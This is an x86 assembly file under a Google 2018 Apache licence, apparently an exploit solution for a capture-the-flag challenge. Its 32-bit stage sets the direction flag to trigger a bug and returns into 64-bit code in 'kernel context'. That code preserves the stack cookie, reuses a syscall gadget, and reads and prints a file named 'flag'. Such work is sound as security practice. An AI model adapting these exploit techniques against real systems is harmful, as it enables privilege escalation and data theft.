; Copyright 2018 Google LLC
;
; Licensed under the Apache License, Version 2.0 (the "License");
; you may not use this file except in compliance with the License.
; You may obtain a copy of the License at
;
;     https://www.apache.org/licenses/LICENSE-2.0
;
; Unless required by applicable law or agreed to in writing, software
; distributed under the License is distributed on an "AS IS" BASIS,
; WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
; See the License for the specific language governing permissions and
; limitations under the License.

	BITS 32
	jmp	skip_pwn

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; 64-bit code executed in "kernel context"
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

pwn:
	BITS 64

	;; get .text address in the stack
	mov	rbp, [rsp-0x18]
	;; set rbp to syscall gadget in op_open
	add	rbp, 0x48

	mov	rax, 0x0000000067616c66	; flag
	push	rax
	mov	rbx, rsp	; pathname

	;; 	
	sub	rsp, 0x200

	;; set stack cookie
	mov	rdx, [fs:0x28]
	mov	[rsp+0x100], rdx
	;; set return address
	mov	rdx, 0xdead0000 + ret_addr
	mov	[rsp+0x110], rdx

	mov	rax, 0		; dummy value
	jmp	call_rbp

ret_addr:
	;; move kernel address to rbp
	add	rbp, 0x69

	;; call kernel read
	mov	edi, 0		; op (__NR_read)
	mov	rsi, rax	; fd
	mov	rdx, 0xbeef0000	; buf (unsigned int)
	mov	rcx, 32		; size

	mov	rax, 0xdead0000 + kernel_write
	jmp	call_rbp

kernel_write:
	;; call kernel write
	mov	edi, 1		; op (__NR_write)
	mov	rsi, 1		; fd
	mov	rdx, 0xbeef0000	; buf (unsigned int)
	mov	rcx, rax	; size

	mov	rax, 0xdead0000 + exit_group
	jmp	call_rbp

exit_group:
	;; exit_group
	mov	edi, 231	; op (__NR_exit_group)
	mov	rsi, 0		; status

call_rbp:
	;; call rbp is forbidden
	;; ret addr is expected in rax
	push	rax
	push	rbp
	ret
	
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;; 32-bit code that triggers the vulnerability and ret to pwn
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

skip_pwn:
	BITS 32

	mov	esp, 0xbef00000
	sub	esp, 4

	;; da trick
	pushfd
	pop	eax
	or	eax, 0x0400
	push	eax
	popfd

	mov	edi, 2		; op
	mov	esi, esp	; ux
	sub	esi, 2048

	mov	eax, 0xdead0000 + pwn
	mov	[ss:esi-8], eax
	mov	eax, 0x00000000
	mov	[ss:esi-4], eax

	;; jmp to trampoline 64-bit kernel
	;; one cannot call eax because of 0xff which is forbidden...
	;; mov	eax, 0xfffff000
	xor	eax, eax
	dec	eax
	shl	eax, 12
	push	eax
	ret
